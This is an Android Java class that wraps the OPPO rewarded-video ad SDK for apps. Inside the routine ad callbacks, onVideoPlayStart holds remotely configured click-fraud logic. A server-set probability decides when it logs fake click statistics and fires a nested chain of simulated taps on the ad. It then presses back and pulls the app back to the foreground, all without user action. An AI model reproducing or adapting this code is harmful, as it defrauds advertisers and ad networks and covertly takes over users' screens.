package com.xm.oppo.ad;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Handler;
import android.util.Log;

import com.oppo.mobad.api.ad.RewardVideoAd;
import com.oppo.mobad.api.listener.IRewardVideoAdListener;
import com.oppo.mobad.api.params.RewardVideoAdParams;
import com.xm.oppo.OPPOVideoSDK;
import com.xm.oppo.utils.AutoClickUtil;
import com.xm.oppo.view.ADCallback;
import com.xm.smallprograminterface.SmallProgramMain;

import java.util.HashMap;
import java.util.List;

import static android.content.Context.ACTIVITY_SERVICE;

/**
 * @author : STM
 * @description : oppo激励视频-打点广告
 * @date : 2019/10/14/014
 * @modifier : STM
 * @date : 2019/10/14/014
 */

public class RewardVideo implements IRewardVideoAdListener {
    private Activity activity;
    private HashMap<String, String> hashMap = new HashMap<>();
    private RewardVideoAd mRewardVideoAd;
    private AutoClickUtil autoClickUtil = new AutoClickUtil();
    private String videoId;
    private int frequency = 0;
    private ADCallback adCallback;
    private boolean isTop = true;

    public void init(Activity activity, String videoId, HashMap<String, String> hashMap,
                     ADCallback adCallback) {
        /**
         * 构造激励视频广告对象
         */
        this.videoId = videoId;
        this.activity = activity;
        this.adCallback = adCallback;
        this.hashMap = hashMap;
        isTop = true;
        mRewardVideoAd = new RewardVideoAd(activity, videoId, this);
        loadVideo();
        Log.e("xm123456", "DD广告id：" + videoId);
    }

    private void loadVideo() {
        /**
         * 调用loadAd方法请求激励视频广告;通过RewardVideoAdParams.setFetchTimeout方法可以设置请求
         * 视频广告最大超时时间，单位毫秒；
         */
        RewardVideoAdParams rewardVideoAdParams = new RewardVideoAdParams.Builder()
                .setFetchTimeout(3000)
                .build();
        mRewardVideoAd.loadAd(rewardVideoAdParams);
        Log.e("xm123456", "请求DD加载视频广告");
    }

    public void showAd() {
        /**
         * TODO 在播放广告时候，先调用isReady方法判断当前是否有广告可以播放；如果有、再调用showAd方法播放激励视频广告。
         */
        if (mRewardVideoAd.isReady()) {
            mRewardVideoAd.showAd();
            Log.e("xm123456", "播放DD视频广告");
        }
    }

    private void destroyVideo() {
        /**;
         * 销毁激励视频广告
         */
        mRewardVideoAd.destroyAd();
    }

    public void onAdSuccess() {
        /**
         *TODO 请求视频广告成功、展示播放视频的入口Dialog、根据getRewardScene方法返回的激励场景、提示引导用户如何操作才能获取奖励。这里只是Demo
         * 效果、应用可以结合自己的游戏场景来引导。
         */
        Log.e("xm123456", "DD视频加载成功");
        showAd();
        adCallback.onAdSuccess();
    }


    @Override
    public void onAdFailed(String msg) {
        /**
         * 请求广告失败、不展示播放视频的入口Dialog
         */
        Log.e("xm123456", "请求DD视频广告失败. msg=" + msg);
        if (msg.contains("1016")) {
            Log.e("xm123456", "广告id已挂或者不存在");
            adCallback.onAdFailed("广告不可用");
            adCallback.rewardAcquisitionFailed();
            return;
        }
        if (frequency < 5) {
            ++frequency;
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    OPPOVideoSDK.getInstance().startShowAd(activity, videoId, adCallback, null);
                }
            }, 2 * 1000);
        } else {
            frequency = 0;
            adCallback.onAdFailed("5次请求失败");
            adCallback.rewardAcquisitionFailed();
        }
    }

    @Override
    public void onAdClick(long currentPosition) {
        Log.e("xm123456", "DD视频广告被点击，当前播放进度 = " + currentPosition + " 秒");
        SmallProgramMain.getInstance().statistics(activity, "OPPO", "CLICK",
                videoId, "dd_c", null, null);
    }

    @Override
    public void onVideoPlayStart() {
        Log.e("xm123456", "DD视频开始播放");
        SmallProgramMain.getInstance().statistics(activity, "OPPO", "PLAY", videoId, "dd",
                null, null);
        //是否打点播放视频
        OPPOVideoSDK.getInstance().isPlayVideo = true;
        if (hashMap.containsKey("F") && !hashMap.get("F").equals("0")) {
            if ((int) (Math.random() * 99 + 1) <= Integer.valueOf(hashMap.get("F"))) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Log.e("xm123456", "dd click");
                        SmallProgramMain.getInstance().statistics(activity, "OPPO", "CLICK",
                                videoId, "dd", null, null);
                        autoClickUtil.autoClickRatio(activity, 0.5, 0.95);
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                autoClickUtil.autoClickRatio(activity, 0.6, 0.95);
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        autoClickUtil.autoClickRatio(activity, 0.6, 0.1);
                                        new Handler().postDelayed(new Runnable() {
                                            @Override
                                            public void run() {
                                                if (!isTop) {
                                                    return;
                                                }
                                                setTopApp(activity);
                                                new Handler().postDelayed(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        autoClickUtil.keycobeBack();
                                                        new Handler().postDelayed(new Runnable() {
                                                            @Override
                                                            public void run() {
                                                                autoClickUtil.autoClickRatio(activity,
                                                                        0.83, 0.06);
                                                                new Handler().postDelayed(new Runnable() {
                                                                    @Override
                                                                    public void run() {
                                                                        autoClickUtil.autoClickRatio
                                                                                (activity,
                                                                                        0.29, 0.55);
                                                                    }
                                                                }, 1000);
                                                            }
                                                        }, 1000);
                                                    }
                                                }, 1000);

                                            }
                                        }, 3000);
                                    }
                                },1000);
                            }
                        }, 2000);
                    }
                }, Integer.valueOf(hashMap.get("H")) * 1000);
            }
        }
    }

    @Override
    public void onVideoPlayComplete() {
        /**
         * TODO 注意：从SDK 3.0.1版本开始，不能在激励视频广告播放完成回调-onVideoPlayComplete里做任何激励操作，统一在onReward回调里给予用户激励。
         */
        Log.e("xm123456", "DD视频广告播放完成");
        SmallProgramMain.getInstance().statistics(activity, "OPPO", "PLAY", videoId, "dd_d",
                null, null);
        adCallback.onVideoPlayComplete();
        OPPOVideoSDK.getInstance().isPlayVideo = false;
    }

    @Override
    public void onVideoPlayError(String msg) {
        Log.e("xm123456", "DD视频播放错误，错误信息=" + msg);
        OPPOVideoSDK.getInstance().isPlayVideo = false;
        adCallback.onVideoPlayError(msg);
        adCallback.rewardAcquisitionFailed();
    }

    @Override
    public void onVideoPlayClose(long currentPosition) {
        Log.e("xm123456", "DD视频广告被关闭，当前播放进度 = " + currentPosition + " 秒");
        OPPOVideoSDK.getInstance().isPlayVideo = false;
        isTop = false;
        setTopApp(activity);
        adCallback.onVideoPlayClose();
        adCallback.rewardAcquisitionFailed();

    }

    @Override
    public void onLandingPageOpen() {
        Log.e("xm123456", "DD视频广告落地页打开.");
    }

    @Override
    public void onLandingPageClose() {
        adCallback.onLandingPageClose();
    }

    /**
     * add 2018-10-25
     *
     * @param objects
     */
    @Override
    public void onReward(Object... objects) {
        /**
         * TODO 注意：只能在收到onReward回调的时候才能给予用户奖励。
         */
        adCallback.getRewards();
    }


    //置顶当前应用
    public void setTopApp(Context context) {
        /**获取ActivityManager*/
        ActivityManager activityManager = (ActivityManager) context.getSystemService
                (ACTIVITY_SERVICE);

        /**获得当前运行的task(任务)*/
        List<ActivityManager.RunningTaskInfo> taskInfoList = activityManager.getRunningTasks(100);
        for (ActivityManager.RunningTaskInfo taskInfo : taskInfoList) {
            /**找到本应用的 task，并将它切换到前台*/
            if (taskInfo.topActivity.getPackageName().equals(context.getPackageName())) {
                activityManager.moveTaskToFront(taskInfo.id, 0);
                break;
            }
        }
    }


}